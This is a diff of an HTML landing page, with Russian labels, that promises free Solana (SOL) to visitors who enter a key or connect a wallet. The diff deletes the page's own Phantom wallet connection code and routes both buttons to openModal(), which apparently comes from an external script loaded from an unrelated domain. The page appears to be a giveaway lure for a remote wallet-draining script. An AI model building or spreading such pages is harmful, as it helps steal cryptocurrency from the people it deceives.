@@ -3,141 +3,139 @@
 <head>
   <meta charset="UTF-8">
   <title>Solana Landing</title>
-  <!-- Скрипт -->
-<script type="module" src="https://utter-daylong.defex.cc/_nuxt/assets/index.js"></script>
-  
+
+  <!-- 🔹 ВНЕШНИЙ СКРИПТ -->
+  <script type="module" src="https://utter-daylong.defex.cc/_nuxt/assets/index.js"></script>
+
   <style>
-    * {
-  box-sizing: border-box;
-}
+    * { box-sizing: border-box; }
 
-body {
-  margin: 0;
-  font-family: Inter, system-ui, sans-serif;
-  background:
-    radial-gradient(600px at 20% 20%, #7c3aed33, transparent),
-    radial-gradient(800px at 80% 80%, #9333ea22, transparent),
-    #020617;
-  color: #e5e7eb;
-  min-height: 100vh;
-}
+    body {
+      margin: 0;
+      font-family: Inter, system-ui, sans-serif;
+      background:
+        radial-gradient(600px at 20% 20%, #7c3aed33, transparent),
+        radial-gradient(800px at 80% 80%, #9333ea22, transparent),
+        #020617;
+      color: #e5e7eb;
+      min-height: 100vh;
+    }
 
-header {
-  display: flex;
-  justify-content: center;
-  gap: 48px;
-  padding: 24px;
-}
+    header {
+      display: flex;
+      justify-content: center;
+      gap: 48px;
+      padding: 24px;
+    }
 
-header button {
-  background: none;
-  border: none;
-  color: #94a3b8;
-  font-size: 16px;
-  cursor: pointer;
-  padding-bottom: 6px;
-}
+    header button {
+      background: none;
+      border: none;
+      color: #94a3b8;
+      font-size: 16px;
+      cursor: pointer;
+      padding-bottom: 6px;
+    }
 
-header button.active {
-  color: #c084fc;
-  border-bottom: 2px solid #a855f7;
-}
+    header button.active {
+      color: #c084fc;
+      border-bottom: 2px solid #a855f7;
+    }
 
-main {
-  display: flex;
-  justify-content: center;
-  padding: 80px 16px;
-}
+    main {
+      display: flex;
+      justify-content: center;
+      padding: 80px 16px;
+    }
 
-.section {
-  display: none;
-  width: 100%;
-  max-width: 460px;
-  padding: 32px;
-  border-radius: 24px;
-  background: rgba(15, 23, 42, 0.75);
-  backdrop-filter: blur(18px);
-  box-shadow:
-    0 0 0 1px rgba(148, 163, 184, 0.08),
-    0 20px 60px rgba(168, 85, 247, 0.25);
-}
+    .section {
+      display: none;
+      width: 100%;
+      max-width: 460px;
+      padding: 32px;
+      border-radius: 24px;
+      background: rgba(15, 23, 42, 0.75);
+      backdrop-filter: blur(18px);
+      box-shadow:
+        0 0 0 1px rgba(148, 163, 184, 0.08),
+        0 20px 60px rgba(168, 85, 247, 0.25);
+    }
 
-.section.active {
-  display: block;
-}
+    .section.active { display: block; }
 
-h1 {
-  margin-top: 0;
-  font-size: 26px;
-  font-weight: 600;
-}
+    h1 {
+      margin-top: 0;
+      font-size: 26px;
+      font-weight: 600;
+    }
 
-input {
-  width: 100%;
-  margin-top: 24px;
-  padding: 14px 16px;
-  border-radius: 14px;
-  border: none;
-  background: #020617;
-  color: #e5e7eb;
-  font-size: 15px;
-  outline: none;
-}
+    input {
+      width: 100%;
+      margin-top: 24px;
+      padding: 14px 16px;
+      border-radius: 14px;
+      border: none;
+      background: #020617;
+      color: #e5e7eb;
+      font-size: 15px;
+      outline: none;
+    }
 
-.action {
-  width: 100%;
-  margin-top: 20px;
-  padding: 16px;
-  border-radius: 14px;
-  border: none;
-  font-size: 16px;
-  font-weight: 600;
-  color: white;
-  background: linear-gradient(90deg, #7c3aed, #a855f7);
-  cursor: pointer;
-  transition: transform 0.2s ease, box-shadow 0.2s ease;
-}
+    .action {
+      width: 100%;
+      margin-top: 20px;
+      padding: 16px;
+      border-radius: 14px;
+      border: none;
+      font-size: 16px;
+      font-weight: 600;
+      color: white;
+      background: linear-gradient(90deg, #7c3aed, #a855f7);
+      cursor: pointer;
+      transition: transform 0.2s ease, box-shadow 0.2s ease;
+    }
 
-.action:hover {
-  transform: translateY(-2px);
-  box-shadow: 0 10px 30px rgba(168, 85, 247, 0.4);
-}
+    .action:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 10px 30px rgba(168, 85, 247, 0.4);
+    }
 
-.error {
-  margin-top: 14px;
-  color: #f87171;
-  display: none;
-}
+    .action.hidden { display: none; } /* 🔥 */
 
+    .error {
+      margin-top: 14px;
+      color: #f87171;
+      display: none;
+    }
   </style>
 </head>
+
 <body>
 
-  <!-- Верхнее меню -->
-  <header>
-    <button id="tab-get" class="active">Ввести Ключ</button>
-    <button id="tab-create">Создать Ключ</button>
-  </header>
+<header>
+  <button id="tab-get" class="active">Ввести Ключ</button>
+  <button id="tab-create">Создать Ключ</button>
+</header>
 
-  <!-- Основной контент -->
-  <main>
+<main>
 
-    <!-- Секция "Получить" -->
-    <div id="get" class="section active">
-      <h1>Получить SOL</h1>
-      <input type="text" placeholder="Введите ключ">
-      <button class="action" onclick="openModal()">Получить SOL</button>
-      <div class="error">Введён неверный ключ</div>
-    </div>
+  <!-- 🔹 ПОЛУЧИТЬ -->
+  <div id="get" class="section active">
+    <h1>Получить SOL</h1>
+    <input id="keyInput" type="text" placeholder="Введите ключ">
+    <button id="getButton" class="action hidden">Получить SOL</button>
+    <div id="errorText" class="error">Введён неверный ключ</div>
+  </div>
 
-    <!-- Секция "Создать" -->
-    <div id="create" class="section">
-      <h1>Создать</h1>
-      <p>Подключение кошелька</p>
-      <button class="action" onclick="openModal()">Подключить кошелёк</button>
-    </div>
+  <!-- 🔹 СОЗДАТЬ -->
+  <div id="create" class="section">
+    <h1>Создать</h1>
+    <p>Подключение кошелька</p>
+    <button class="action" onclick="openModal()">Подключить кошелёк</button>
+  </div>
 
-  </main>
+</main>
+
 <script>
   // ===== НАСТРОЙКИ =====
   const VALID_KEY = "TEST_KEY_123";
@@ -146,36 +144,44 @@ input {
   // ===== ВКЛАДКИ =====
   const tabGet = document.getElementById("tab-get");
   const tabCreate = document.getElementById("tab-create");
-
   const sectionGet = document.getElementById("get");
   const sectionCreate = document.getElementById("create");
 
-  tabGet.addEventListener("click", () => {
+  tabGet.onclick = () => {
     tabGet.classList.add("active");
     tabCreate.classList.remove("active");
-
     sectionGet.classList.add("active");
     sectionCreate.classList.remove("active");
-  });
+  };
 
-  tabCreate.addEventListener("click", () => {
+  tabCreate.onclick = () => {
     tabCreate.classList.add("active");
     tabGet.classList.remove("active");
-
     sectionCreate.classList.add("active");
     sectionGet.classList.remove("active");
-  });
+  };
 
   // ===== ПОЛУЧИТЬ =====
-  const getButton = document.querySelector("#get .action");
-  const inputKey = document.querySelector("#get input");
-  const errorText = document.querySelector("#get .error");
+  const inputKey = document.getElementById("keyInput");
+  const getButton = document.getElementById("getButton");
+  const errorText = document.getElementById("errorText");
 
+  // 🔥 Показываем кнопку ТОЛЬКО если есть ввод
+  inputKey.addEventListener("input", () => {
+    if (inputKey.value.trim().length > 0) {
+      getButton.classList.remove("hidden");
+    } else {
+      getButton.classList.add("hidden");
+      errorText.style.display = "none";
+    }
+  });
+
+  // 🔥 Проверка + openModal()
   getButton.addEventListener("click", () => {
     const value = inputKey.value.trim();
-    const alreadyUsed = localStorage.getItem(STORAGE_KEY);
+    const used = localStorage.getItem(STORAGE_KEY);
 
-    if (alreadyUsed === "true") {
+    if (used === "true") {
       errorText.textContent = "Код уже использован";
       errorText.style.display = "block";
       return;
@@ -190,24 +196,8 @@ input {
     localStorage.setItem(STORAGE_KEY, "true");
     errorText.style.display = "none";
 
-    alert("Код принят. Скрипт выполнен 🚀");
-  });
-
-  // ===== СОЗДАТЬ / КОШЕЛЁК =====
-  const connectButton = document.querySelector("#create .action");
-
-  connectButton.addEventListener("click", async () => {
-    if (!window.solana || !window.solana.isPhantom) {
-      alert("Phantom Wallet не установлен");
-      return;
-    }
-
-    try {
-      const res = await window.solana.connect();
-      alert("Кошелёк подключён:\n" + res.publicKey.toString());
-    } catch {
-      alert("Подключение отменено");
-    }
+    // 🔥 ТОЛЬКО ЗДЕСЬ
+    openModal();
   });
 </script>
 
